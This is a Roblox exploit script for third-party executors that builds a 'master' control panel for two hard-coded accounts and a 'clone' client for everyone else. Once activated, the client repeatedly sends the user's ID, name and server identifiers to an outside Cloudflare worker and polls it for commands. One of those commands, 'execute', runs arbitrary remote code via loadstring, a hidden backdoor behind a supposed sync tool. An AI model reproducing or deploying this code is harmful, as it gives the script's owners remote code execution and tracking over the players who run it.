local CF_URL = "https://control.huynesoi270111.workers.dev"
local req = (syn and syn.request) or (http and http.request) or http_request or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")

local MASTERS = {["huynesoi"] = true, ["soicon19911"] = true}
local isMaster = MASTERS[LP.Name] or false

local selectedLead = nil
local selectedFollowers = {}
local currentViewing = nil
local isPossessing = false

local function Post(path, data)
    local suc, res = pcall(function()
        return req({
            Url = CF_URL .. path,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    if suc and res and res.Body then
        local s, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if s then return d end
    end
    return nil
end

if isMaster then
    local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 650, 0, 450)
    main.Position = UDim2.new(0.5, -325, 0.5, -225)
    main.BackgroundColor3 = Color3.fromHex("#1E1F22")
    main.Active = true
    main.Draggable = true
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)

    local leftPanel = Instance.new("Frame", main)
    leftPanel.Size = UDim2.new(0.35, 0, 1, -120)
    leftPanel.Position = UDim2.new(0, 10, 0, 10)
    leftPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", leftPanel)

    local scroll = Instance.new("ScrollingFrame", leftPanel)
    scroll.Size = UDim2.new(1, -10, 1, -10)
    scroll.Position = UDim2.new(0, 5, 0, 5)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    local layout = Instance.new("UIListLayout", scroll)
    layout.Padding = UDim.new(0, 8)

    local rightPanel = Instance.new("Frame", main)
    rightPanel.Size = UDim2.new(0.65, -30, 1, -120)
    rightPanel.Position = UDim2.new(0.35, 20, 0, 10)
    rightPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", rightPanel)

    local avatarImg = Instance.new("ImageLabel", rightPanel)
    avatarImg.Size = UDim2.new(0, 100, 0, 100)
    avatarImg.Position = UDim2.new(0, 15, 0, 15)
    avatarImg.BackgroundColor3 = Color3.fromHex("#1E1F22")
    Instance.new("UICorner", avatarImg)

    local dInfo = Instance.new("TextLabel", rightPanel)
    dInfo.Size = UDim2.new(1, -140, 0, 100)
    dInfo.Position = UDim2.new(0, 130, 0, 15)
    dInfo.BackgroundTransparency = 1
    dInfo.TextColor3 = Color3.new(1,1,1)
    dInfo.TextXAlignment = Enum.TextXAlignment.Left
    dInfo.TextYAlignment = Enum.TextYAlignment.Top
    dInfo.TextSize = 14
    dInfo.RichText = true

    local dControl = Instance.new("TextButton", rightPanel)
    dControl.Size = UDim2.new(0.42, 0, 0, 45)
    dControl.Position = UDim2.new(0.05, 0, 0, 135)
    dControl.BackgroundColor3 = Color3.fromRGB(255,255,0)
    dControl.TextColor3 = Color3.new(0,0,0)
    dControl.Text = "SELECT LEAD"
    dControl.Font = Enum.Font.GothamBold
    Instance.new("UICorner", dControl)

    local dSync = Instance.new("TextButton", rightPanel)
    dSync.Size = UDim2.new(0.42, 0, 0, 45)
    dSync.Position = UDim2.new(0.53, 0, 0, 135)
    dSync.BackgroundColor3 = Color3.fromRGB(0,255,0)
    dSync.TextColor3 = Color3.new(0,0,0)
    dSync.Text = "ADD SLAVE"
    dSync.Font = Enum.Font.GothamBold
    Instance.new("UICorner", dSync)

    local bottomPanel = Instance.new("Frame", main)
    bottomPanel.Size = UDim2.new(1, -20, 0, 90)
    bottomPanel.Position = UDim2.new(0, 10, 1, -100)
    bottomPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", bottomPanel)

    local startControlBtn = Instance.new("TextButton", bottomPanel)
    startControlBtn.Size = UDim2.new(0.48, 0, 0, 35)
    startControlBtn.Position = UDim2.new(0, 10, 0, 10)
    startControlBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    startControlBtn.TextColor3 = Color3.new(0,0,0)
    startControlBtn.Text = "START CONTROL"
    startControlBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", startControlBtn)

    local syncSlavesBtn = Instance.new("TextButton", bottomPanel)
    syncSlavesBtn.Size = UDim2.new(0.48, 0, 0, 35)
    syncSlavesBtn.Position = UDim2.new(0.5, 5, 0, 10)
    syncSlavesBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    syncSlavesBtn.TextColor3 = Color3.new(0,0,0)
    syncSlavesBtn.Text = "SYNC SLAVES"
    syncSlavesBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", syncSlavesBtn)

    local cancelBtn = Instance.new("TextButton", bottomPanel)
    cancelBtn.Size = UDim2.new(0.97, 0, 0, 30)
    cancelBtn.Position = UDim2.new(0, 10, 0, 50)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
    cancelBtn.TextColor3 = Color3.new(1,1,1)
    cancelBtn.Text = "STOP ALL & REVEAL"
    cancelBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", cancelBtn)

    local function updateList()
        local users = Post("/list", {})
        if not users then return end
        for _, v in pairs(scroll:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
        
        for _, u in ipairs(users) do
            local b = Instance.new("TextButton", scroll)
            b.Size = UDim2.new(1, 0, 0, 45)
            b.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            b.TextColor3 = Color3.new(1,1,1)
            b.Text = "      " .. u.name
            b.TextXAlignment = Enum.TextXAlignment.Left
            Instance.new("UICorner", b)

            local stroke = Instance.new("UIStroke", b)
            stroke.Color = Color3.new(1,1,1)
            stroke.Thickness = 1.5
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

            local btnIcon = Instance.new("ImageLabel", b)
            btnIcon.Size = UDim2.new(0, 35, 0, 35)
            btnIcon.Position = UDim2.new(0, 5, 0.5, -17)
            btnIcon.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=150&h=150"
            Instance.new("UICorner", btnIcon).CornerRadius = UDim.new(1,0)

            if selectedLead == u.name then
                b.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
                b.TextColor3 = Color3.new(0,0,0)
            elseif selectedFollowers[u.name] then
                b.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                b.TextColor3 = Color3.new(0,0,0)
            end

            b.MouseButton1Click:Connect(function()
                currentViewing = u
                avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=420&h=420"
                dInfo.Text = string.format("<b>NAME:</b> %s\n<b>ID:</b> %d\n<b>UPTIME:</b> %ds", u.name, u.id, u.uptime)
            end)
        end
    end

    dControl.MouseButton1Click:Connect(function() if currentViewing then selectedLead = currentViewing.name updateList() end end)
    dSync.MouseButton1Click:Connect(function() if currentViewing then selectedFollowers[currentViewing.name] = true updateList() end end)

    startControlBtn.MouseButton1Click:Connect(function()
        if not selectedLead then return end
        isPossessing = true
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        
        task.spawn(function()
            while isPossessing and task.wait() do
                local target = Players:FindFirstChild(selectedLead)
                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                    if LP.Character then
                        for _, p in pairs(LP.Character:GetDescendants()) do
                            if p:IsA("BasePart") then p.Transparency = 1 p.CanCollide = false end
                        end
                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
                    end
                end
            end
        end)
    end)

    syncSlavesBtn.MouseButton1Click:Connect(function()
        if selectedLead then
            for fName, _ in pairs(selectedFollowers) do
                Post("/send_cmd", {target = fName, type = "sync_to", data = selectedLead})
            end
        end
    end)

    cancelBtn.MouseButton1Click:Connect(function()
        isPossessing = false
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
        if LP.Character then
            for _, p in pairs(LP.Character:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 0 end end
        end
        for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "stop_sync", data = ""}) end
        selectedLead = nil
        selectedFollowers = {}
        updateList()
    end)

    task.spawn(function() while task.wait(3) do updateList() end end)

else
    local slaveGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local sFrame = Instance.new("Frame", slaveGui)
    sFrame.Size = UDim2.new(0, 200, 0, 80)
    sFrame.Position = UDim2.new(0.5, -100, 0.5, -40)
    sFrame.BackgroundColor3 = Color3.fromHex("#1E1F22")
    sFrame.Active = true
    sFrame.Draggable = true
    Instance.new("UICorner", sFrame)
    
    local sBtn = Instance.new("TextButton", sFrame)
    sBtn.Size = UDim2.new(1, -20, 1, -20)
    sBtn.Position = UDim2.new(0, 10, 0, 10)
    sBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    sBtn.TextColor3 = Color3.new(1,1,1)
    sBtn.Text = "ACTIVATE CLONE"
    Instance.new("UICorner", sBtn)

    sBtn.MouseButton1Click:Connect(function()
        slaveGui:Destroy()
        local startTime = os.time()
        task.spawn(function()
            while task.wait(3) do
                Post("/update", {id = LP.UserId, name = LP.Name, jobId = game.JobId, placeId = game.PlaceId, uptime = os.time() - startTime})
            end
        end)

        local activeTarget = nil
        task.spawn(function()
            while task.wait(1) do
                local cmd = Post("/get_cmd", {name = LP.Name})
                if cmd and cmd.type then
                    if cmd.type == "sync_to" then activeTarget = cmd.data
                    elseif cmd.type == "stop_sync" then activeTarget = nil
                    elseif cmd.type == "execute" then local f = loadstring(cmd.data) if f then task.spawn(f) end end
                end
            end
        end)

        task.spawn(function()
            while task.wait() do
                if activeTarget then
                    local t = Players:FindFirstChild(activeTarget)
                    if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = t.Character.HumanoidRootPart.CFrame
                    end
                end
            end
        end)
    end)
end
